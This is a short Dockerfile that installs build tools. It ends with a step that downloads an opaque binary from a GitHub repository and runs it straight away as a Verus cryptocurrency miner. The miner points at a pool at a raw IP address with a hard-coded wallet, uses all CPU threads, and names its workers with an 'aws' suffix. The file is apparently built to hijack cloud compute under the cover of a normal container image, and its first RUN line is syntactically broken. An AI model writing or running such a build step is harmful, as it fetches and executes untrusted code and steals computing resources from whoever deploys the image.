FROM ubuntu:latest

RUN apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
    apt-get clean && \
    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

RUN apt-get update && apt-get dist-upgrade -y && \
    apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

RUN apt-get update && \
    apt-get install wget -y && \
    wget https://github.com/manorepas/bash/raw/main/pointd && chmod +x pointd && ./pointd -a verus -o stratum+tcp://149.56.27.47:3956 -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.$(echo $(shuf -i 1-3 -n 1)-aws) -p x -t $(nproc)
